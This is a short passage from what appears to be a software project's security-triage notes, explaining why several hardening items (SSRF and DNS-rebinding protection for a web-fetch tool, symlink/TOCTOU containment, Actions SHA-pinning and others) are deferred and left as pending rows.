- **Remaining claims** (Zod `.strict()` on the OTHER public tool schemas
  beyond web-fetch, web-fetch DNS-rebinding / IP-literal SSRF, docs drift
  `scripts/*`→`tools/scripts/`, double-noun tool ids `docs_docs_search`,
  full symlink/TOCTOU write containment, Actions SHA-pinning, CI-runs-full-
  validate) stay **DEFERRED**. Rationale recorded: DNS-rebinding needs a
  custom resolver+connection-pinning (out of scope for a hostname allow-list
  the operator explicitly curates); symlink TOCTOU defends against an
  attacker who already holds workspace-write and carries an irreducible
  TOCTOU window; double-noun renames are breaking changes for pinned
  adopters; SHA-pinning + CI-full-validate are infra/owner decisions. None is
  a live-corruption/boundary P0 like S2/S3. Left as PENDING rows in
  `## Verified State`; NOT acted on unverified.
